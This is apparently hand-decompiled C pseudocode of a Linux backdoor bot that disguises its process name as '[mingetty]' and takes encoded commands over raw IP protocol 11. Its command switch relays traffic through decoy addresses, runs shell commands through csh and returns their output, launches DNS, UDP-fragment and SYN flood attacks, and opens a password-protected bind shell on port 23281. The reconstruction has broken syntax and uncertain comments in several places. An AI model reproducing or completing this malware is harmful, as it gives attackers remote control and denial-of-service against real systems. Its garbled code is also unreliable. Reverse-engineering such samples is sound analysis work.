MainMonster(char *procname)
{
	DWORD		randval;
	DWORD		SizeOfAssignDestIP;
	char		*pPayload;
	DWORD		*pNextDest;
	char		*pPayloadBuf;
	FILE		FileHandle;
	char		*pRecvContent;
	char		*pRecvProto;
	char		*pRecvBuf;
	socket	sock_id;
	socket	sock_stream;
	DWORD		Socklen;
	DWORD		OptionValue;		//??
	char		DestBuf[256];
	char		Buffer[12772];
	sockaddr	*pPeerSockAddr;
	sockaddr	SockAddr;
	DWORD		RelayDest[10];
	char		Payload[0x190];
	char		PayloadBuf[0x200];
	char		RecvBuf[0x800];

	pRecvBuf = &RecvBuf;
	pRecvProto = &( (recvbuf)RecvBuf.Proto );
	
	if	(getuid() !=0)
		exit();
	
	memset(procname, 0, ??);
	procname = "[mingetty]";
	
	signal(SIG_IGN, SIGCHLD);
	if 	(fork() !=0)
		exit();		,Parent
	//Child
	setsid();
	signal(SIG_IGN, SIGCHLD);
	if (fork() != 0)
		exit();
	chdir("/");
	close(0);
	close(1);
	close(2);
	
	gProc_ID = 0; 
	gPid = 0; 
	gSwitch_Num = 0;
	
	time(0);
	srandom(eax);
	
	sock_stream = socket(AF_INET, SOCK_RAW, 11);
	signal(SIG_IGN, SIGHUP);
	signal(SIG_IGN, SIGTERM);
	signal(SIG_IGN, SIGCHLD);
	signal(SIG_IGN, SIGCHLD);
	
	pPayloadBuf = &PayloadBuf;
	pNextDest = &RelayDest[0];
	
	while (1)	{
		int size = recv(sock_stream, RecvBuf, 0x800, 0);
		if (	( 	(recvbuf)RecvBuf.ip.protocol == Ox0B) && 
				( *(PUCHAR)pRecvProto == 2 ) &&
				( size > 200 ) )
		{
			Decoder(pPayloadBuf, pRecvContent, size-0x16);
			
			Switch( (*(pPayloadBuf+1) - 1) )
			{
				case 0:	//Relaying
					RecvBuf[0] = State1;	//??
					RecvBuf[0] = State2;	//??
					RecvBuf[1] = 1;		//Set next hop?
					RecvBuf[2] = 7;
					if (gProc_ID == 0)
						RecvBuf[3] = 0;
					else	
					{
						RecvBuf[3] = 1;
						RecvBuf[4] = gSwitch_Num;
					}//end if
					Encoder(0x190, RecvBuf, pPayload);
					Relay(pNextDest, pPayloadBuf, 0x190 + random()%201 );
					break;

				case 1:	//Set Relay IP
					gCtrl_Parameter = (DWORD)PayloadBuf[2];
					gHost_IP = RecvBuf.ip.dst;
					srandom( time(0) );

					int indexof_real_ip = random()%10;

					i = 0;
					index = 0;

					do {
						if( i != indexof_real_ip ) {

							if( gctrl_parameter == 2 ) {
								// use ip list supplied in payload

								
								pNextDest[ index ] = payloadbuf[ i *4 + 3 ];
								
								pNextDest[ index + 1 ] = payloadbuf[ i *4 + 4 ];
								
								pNextDest[ index + 2 ] = payloadbuf[ i *4 + 5 ];
								
								pNextDest[ index + 3 ] = payloadbuf[ i *4 + 6 ];
							} else {
								// use randomly generated ip

								pNextDest[ index ] = randval = random();
								if( randval < 0 ) randval += 0xff;

								pNextDest[ index + 1 ] = randval = random();
								if( randval < 0 ) randval += 0xff;

								pNextDest[ index + 2 ] = randval = random();
								if( randval < 0 ) randval += 0xff;

								pNextDest[ index + 3 ] = randval = random();
								if( randval < 0 ) randval += 0xff;
							}

						}
						index += 4;
						i ++;
	
					} while( i <= 9 );

					if( gctrl_parameter == 0 ) indexof_real_ip = 0;

					if( gctrl_parameter == 2 ) break;

					indexof_real_ip *= 4;
					pNextDest[ indexof_real_ip ] = payload[ 3 ];
					pNextDest[ indexof_real_ip + 1 ] = payload[ 4 ];
					pNextDest[ indexof_real_ip + 2 ] = payload[ 5 ];
					pNextDest[ indexof_real_ip + 3 ] = payload[ 6 ];
					break;
				case 2:		//Recv cmd, send out results.
					gPid = fork();
					if (gPid == 0)
					{
						setsid();
						signal( SIGCHLD, SIG_IGN );
						if ( fork() != 0)
							{
								sleep(0xa);
								kill( gPid, 9);
								exit(0);	
							}
						for (int i = 0; i <= 0x18d; i++)
							Payload[i] = PayloadBuf[i+2];
						sprintf( RecvBuf, "/bin/csh -f -c \"%s\" 1> %s 2>&1", pPayloadBuf, "/tmp/.hj237349" );
						system( RecvBuf );
						if ( ( FileHandle = fopen( "/tmp/.hj237349", "rb" ) ) != 0 )
						{
							int k = 0;
							pPayload = &Payload;
							do
							{
								int readsize = fread( RecvBuf, 1, 0x18e, FileHandle );
								*(RecvBuf+readsize) = '\0';
								for (int j = 0; j <= 0x18d, j++)
									PayloadBuf[j+2] = RecvBuf[j];
								if ( k != 0 )
									PayloadBuf[1] = 4;
								else
								{
									PayloadBuf[1] = 3;
									k = 1;	
								}
								Encoder( 0x190, pPayloadBuf, pPayload );
								
								Relay( [NextDest, pPayload, 0x190+random()%201 );
								usleep(0x61a80);
							} while (readsize != 0);
							fclose(FileHandle);
							unlink( "/tmp/.hj237349" );
						}
						sys_exit(0);
					}
					break;
				
				case 3:
					if  ( gProc_ID != 0 )
						break;
					gSwitch_Num = 4;
					gProd_ID = fork();
					if ( gProd_ID != 0 )
						break;
					for (int i = 0; i < 63*4; i++)
						DestBuf[i] = PayloadBuf[i];
					for (int i = 0; i <= 254; i++)
						DestBuf[i] = DestBuf[i+9];
					DNS_Query_Attack( PayloadBuf[2], PayloadBuf[3], PayloadBuf[4], PayloadBuf[5],
											0, PayloadBuf[6], PayloadBuf[7], PayloadBuf[8], DestBuf );
					sys_exit(0);
				
				case 4:	//frag_Attack
					if ( gProc_ID == 0 )
						break;
					gSwitch_Num = 5;
					gProc_ID = fork();
					if ( gProc_ID != 0 )
						break;
					for (int i = 0; i < 63*4; i++)
						DestBuf[i] = PayloadBuf[i];
					for (int i = 0; i < 254; i++)
						DestBuf[i] = DestBuf[i+13];
					
					UDP_Attack( Payload[2], Payload[3], Payload[4], Payload[5], Payload[6], Payload[7], 
									Payload[8],	Payload[9], Payload[10], Payload[11], Payload[12], DestBuf );
					sys_exit(0);
				
				case 5:		//Remote Shell
					if ( gProc_ID != 0 )
						break;
					gSwitch_Num = 6;
					
					signal( SIGCHLD, SIG_IGN );
					gProc_ID = fork();
					if ( !gProc_ID )
						break;
					
					setsid();
					signal( SIGCHLD, SIG_IGN );
					SockAddr.sin_family = 2;
					SockAddr.sin_port = 0xf15a; // network byte order => port 23281
					SockAddr.sin_addr = 0;
					OptionValue = 1;
					
					socket_stream = socket( AF_INET, SOCK_STREAM, SOL_IP );
					signal( SIGCHLD, SIG_IGN );
					signal( SIGCHLD, SIG_IGN );
					signal( SIGHUP, SIG_IGN );
					signal( SIGTERM, SIG_IGN );
					signal( SIGINT, SIG_IGN );
					
					setsockopt( socket_stream, 1, 2, &OptionValue, sizeof(OptionValue) );
					bind( socket_stream, &SockAddr, sizeof(sockaddr) );
					listen( socket_stream, 3 );
					
					do
					{
						socket_id = accept( socket_stream, pPeerSockAddr, SockLen );
						if ( !socket_id )
							exit(0);
					} while ( !fork() )
					
					recv( socket_id, Buffer, 0x13, 0 );
					
					for (int i = 0; i < 0x12; i++)
					{
						if (Buffer[i] == 0xa || Buffer[i] == 0xd)
							Buffer[i] = 0;
						else
							Buffer[i]++;
					}					

					if  (Buffer[0-5] != "TfOjG" ) // all char minus 1 => SeNiF
					{
						send( socket_id, &buf, 4, 0 );
						close( socket_id );
						exit(1);
					}
					else
					{
						dup2( socket_id, 0 );
						dup2( socket_id, 1 );
						dup2( socket_id, 2 );
						setenv( "PATH", "/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/bin/:.", 1 );
						getenv( "HISTFILE" );
						setenv( "TERM", "linux", 1 );
						execv( "/bin/sh", "sh", 0 );
						close( socket_id );
						exit(0);
					}
					break;
					
				case 6:
					gPid = fork();
					if ( !gPid )
						break;
					setsid();
					signal( SIGCHLD, SIG_IGN );
					
					if ( fork() )
					{
						sleep(0x4b0);
						kill(gPid, 9);
						exit(0);	
					}
					for (int i = 0; i <= 0x18d, i++)
						PayloadBuf[i] =	PayloadBuf[i+2];
					sprintf( RecvBuf,  "/bin/csh -f -c \"%s\" ", pPayload );
					system( RecvBuf );
					sys_exit(0);
				
				case 7:
					if ( !gProc_ID )
						break;
					kill( gProc_ID, 9 );
					gProc_ID = 0;
					break;
				
				case 8:
					if ( gProc_ID != 0 )
						break;
					gSwitch_Num = 9;
					gProc_ID = fork();
					if ( gProc_ID != 0 )
						break;
					for (int i = 0; i<63*4 ; i++)
						DestBuf[i] = PayloadBuf[i];	
					for (int i = 0; i <= 254, i++)
						DestBuf[i] = DestBuf[i+10];
					DNS_Query_Attack( PayloadBuf[2], PayloadBuf[3], PayloadBuf[4], PayloadBuf[5],
											PayloadBuf[6], PayloadBuf[7], PayloadBuf[8], PayloadBuf[9], DestBuf );
					sys_exit(0);
					break;
					
				case 9:
					if (gProc_ID != 0)
						break;
					gSwitch_Num = 0xa;
					gProc_ID = fork();
					if (gProc_ID != 0)
						break;
					for (int i = 0; i<63*4 ; i++)
						DestBuf[i] = PayloadBuf[i];	
					for (int i = 0; i <= 254, i++)
						DestBuf[i] = DestBuf[i+14];
					SYN_Attack( PayloadBuf[2], PayloadBuf[3], PayloadBuf[4], PayloadBuf[5], PayloadBuf[6], 
									PayloadBuf[7], PayloadBuf[8], PayloadBuf[9], PayloadBuf[10], PayloadBuf[11], 
									PayloadBuf[12], 0, PayloadBuf[13], DestBuf );
					sys_exit(0);
					break;
					
				case 10:
					if (gProc_ID != 0)
						break;
					gSwitch_Num = 0xb;
					gProc_ID = fork();
					if (gProc_ID != 0)
						break;
					for (int i = 0; i<63*4 ; i++)
						DestBuf[i] = PayloadBuf[i];	
					for (int i = 0; i <= 254, i++)
						DestBuf[i] = DestBuf[i+15];
					SYN_Attack( PayloadBuf[2], PayloadBuf[3], PayloadBuf[4], PayloadBuf[5], PayloadBuf[6], 
									PayloadBuf[7], PayloadBuf[8], PayloadBuf[9], PayloadBuf[10], PayloadBuf[11], 
									PayloadBuf[12], PayloadBuf[13], PayloadBuf[14], DestBuf );
					sys_exit(0);
					break;
					
				case 11:
					if (gProc_ID != 0)
						break;
					gSwitch_Num = 0xc;
					gProc_ID = fork();
					if (gProc_ID != 0)
						break;
					for (int i = 0; i<63*4 ; i++)
						DestBuf[i] = PayloadBuf[i];	
					for (int i = 0; i <= 254, i++)
						DestBuf[i] = DestBuf[i+14];
					DNS_Attack( PayloadBuf[2], PayloadBuf[3], PayloadBuf[4], PayloadBuf[5], PayloadBuf[6], 
									PayloadBuf[7], PayloadBuf[8], PayloadBuf[9], PayloadBuf[10], PayloadBuf[11], 
									PayloadBuf[12], PayloadBuf[13], DestBuf );
					sys_exit(0);
					break;
				default:
					break;										
			}//end switch
		}//end if

	sleep(0x2710);
	}//end while

}

